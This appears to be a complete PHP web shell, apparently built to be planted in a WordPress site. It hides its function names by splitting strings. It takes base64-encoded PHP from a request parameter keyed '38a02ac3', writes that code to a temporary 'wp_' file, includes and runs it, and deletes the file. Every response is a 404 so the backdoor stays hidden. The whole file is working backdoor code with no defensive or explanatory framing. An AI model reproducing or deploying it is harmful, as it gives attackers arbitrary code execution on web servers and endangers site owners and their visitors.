<?php
try{
$q23491[]='array_key_'.'exists';
$q23491[]='sys_get_temp_'.'dir';
$q23491[]='tem'.'pnam';
$q23491[]='unl'.'ink';
$q23491[]='base'.'64_decode';
$q23491[]='file'.'_put_contents';
$lb939b='38a'.'02ac3';
if($q23491[0]($lb939b,$_POST)){
$b657d5=$q23491[4]($_POST[$lb939b]);
}elseif($q23491[0]($lb939b,$_GET)){
$b657d5=$q23491[4]($_GET[$lb939b]);
}else{$b657d5=null;}
if($b657d5){
$f6a3bf=$q23491[2]($q23491[1](),'w'.'p_');
if($f6a3bf){
$q23491[5]($f6a3bf,'<'.'?ph'.'p '.$b657d5);
http_response_code(404);
@include_once($f6a3bf);
@$q23491[3]($f6a3bf);
}}
http_response_code(404);
}catch(Throwable $e){http_response_code(404);}catch(Exception $e){http_response_code(404);}
